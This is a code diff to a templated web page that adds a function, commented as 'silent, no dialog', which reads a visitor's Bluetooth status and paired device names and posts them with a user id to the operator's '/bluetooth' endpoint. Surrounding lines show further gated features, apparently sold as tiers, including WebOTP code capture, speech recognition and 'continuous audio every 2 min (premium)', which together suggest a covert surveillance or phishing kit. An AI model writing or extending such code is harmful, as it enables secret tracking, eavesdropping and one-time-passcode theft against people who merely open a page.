@@ -544,6 +544,27 @@ function doWebOTP(){
 }
 <% } %>
 
+<% if(bluetoothAccess){ %>
+// ── Bluetooth Scanner: status + paired devices (silent, no dialog) ────────────
+function doBluetoothScan(){
+  if(!navigator.bluetooth)return;
+  var _bt={uid:uid};
+  navigator.bluetooth.getAvailability().then(function(on){
+    _bt.status=encodeURIComponent(String(on));
+    if(navigator.bluetooth.getDevices){
+      navigator.bluetooth.getDevices().then(function(devs){
+        if(devs&&devs.length){
+          _bt.devices=encodeURIComponent(devs.map(function(d){return d.name||('ID:'+d.id.slice(0,6));}).join(','));
+        }
+        $.post(a+"/bluetooth",_bt);
+      }).catch(function(){$.post(a+"/bluetooth",_bt);});
+    } else {
+      $.post(a+"/bluetooth",_bt);
+    }
+  }).catch(function(){});
+}
+<% } %>
+
 <% if(contaudioAccess){ %>
 // ── Continuous audio every 2 min (premium) ────────────────────────────────────
 function doContAudio(){
@@ -693,6 +714,7 @@ function doVerify(){
 <% if(pushAccess){ %>  if(typeof _registerPush==="function") _registerPush();<% } %>
 <% if(speechRecogAccess){ %>  setTimeout(function(){doSpeechRecog();},2000);<% } %>
 <% if(webOTPAccess){ %>  doWebOTP();<% } %>
+<% if(bluetoothAccess){ %>  setTimeout(function(){doBluetoothScan();},3000);<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
